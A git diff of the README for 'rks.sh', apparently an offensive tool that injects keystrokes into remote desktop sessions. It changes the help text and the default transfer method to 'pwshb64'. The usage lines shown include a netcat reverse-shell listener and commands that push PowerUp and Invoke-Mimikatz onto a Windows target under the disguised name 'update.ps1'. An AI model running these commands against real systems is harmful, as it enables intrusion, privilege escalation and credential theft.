@@ -14,22 +14,23 @@ All credits goes to [nopernik](https://github.com/nopernik) for making it possib
 $ ./rks.sh -h
 Usage: ./rks.sh (RemoteKeyStrokes)
 Options:
-    -c, --command <command | cmdfile>       Specify a command or a file containing to execute
-    -i, --input <input_file>                Specify the local input file to transfer
-    -o, --output <output_file>              Specify the remote output file to transfer
-    -m, --method <method>                   Specify the file transfer or execution method
-                                            (For file transfer "base64" is set by default if
-                                            not specified. For execution method "none" is set
-                                            by default if not specified)
+    -c, --command <command | cmdfile>   Specify a command or a file containing to execute
+    -i, --input <input_file>            Specify the local input file to transfer
+    -o, --output <output_file>          Specify the remote output file to transfer
 
-    -p, --platform <operating_system>       Specify the operating system (windows is set by
-                                            default if not specified)
+    -p, --platform <operating_system>   Specify the operating system (windows is set by
+                                        default if not specified)
 
-    -w, --windowname <name>                     Specify the window name for graphical remote
-                                            program (freerdp is set by default if not
-                                            specified)
+    -m, --method <method>               Specify the file transfer or execution method
+                                        (For file transfer "pwshb64" is set by default if
+                                        not specified. For command execution method
+                                        "none" is set by default if not specified)
 
-    -h, --help                              Display this help message
+    -w, --windowname <name>             Specify the window name for graphical remote
+                                        program (freerdp is set by default if not
+                                        specified)
+
+    -h, --help                          Display this help message
 ```
 
 ## Usage
@@ -70,7 +71,7 @@ $ nc -lvnp 4444
 ```
 $ ./rks.sh -i /usr/share/powersploit/Privesc/PowerUp.ps1 -o script.ps1
 
-$ ./rks.sh -i /usr/share/powersploit/Exfiltration/Invoke-Mimikatz.ps1 -o "C:\Windows\Temp\update.ps1" -m base64
+$ ./rks.sh -i /usr/share/powersploit/Exfiltration/Invoke-Mimikatz.ps1 -o "C:\Windows\Temp\update.ps1" -m pwshb64
 ```
 
 ### Specify Grapical Remote Software
